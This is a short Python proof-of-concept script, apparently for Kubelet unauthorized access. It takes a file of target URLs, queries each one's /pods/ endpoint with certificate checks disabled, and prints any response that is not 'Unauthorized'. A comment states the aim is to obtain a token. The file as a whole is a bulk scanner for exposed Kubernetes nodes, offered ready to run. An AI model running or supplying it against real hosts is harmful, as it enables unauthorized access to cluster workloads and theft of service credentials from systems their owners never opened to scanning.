import requests
import sys
import warnings
# 忽略 SSL 警告
from urllib3.exceptions import InsecureRequestWarning
warnings.simplefilter('ignore', InsecureRequestWarning)


def search_vul(url_file):
    with open(url_file, 'r', encoding='utf-8') as file:
        urls = [line.strip() for line in file]
        urls_len = len(urls)
        result = ''
        for i in range(0, urls_len):
            #/pods  获得token
            url = urls[i] + '/pods/'
            try:
                response = requests.get(url, verify=False, timeout=10)
                if response.text != 'Unauthorized':
                    result += url + '\n'
                    print(response.text)
                else:
                    print(f'no\t{response.text}')
            except Exception as e:
                print(e)

if __name__ == '__main__':

    val_x=sys.argv[1]
    if val_x=='-h':
        print("python3 Kubelet_poc.py -f urls.txt")
    elif val_x=='-f':
        url_file=sys.argv[2]
        print(search_vul(url_file))




